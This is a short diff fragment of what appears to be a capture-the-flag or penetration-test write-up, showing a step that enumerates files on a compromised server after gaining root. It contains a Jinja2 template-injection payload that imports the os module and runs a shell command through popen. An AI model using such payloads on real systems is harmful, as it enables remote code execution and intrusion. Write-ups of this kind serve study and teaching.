@@ -89,7 +89,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ### 4. Enumerate files in the working directory
 
-Next, I listed files by submitting:
++ Next, I listed files by submitting:
 
 ```bash
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
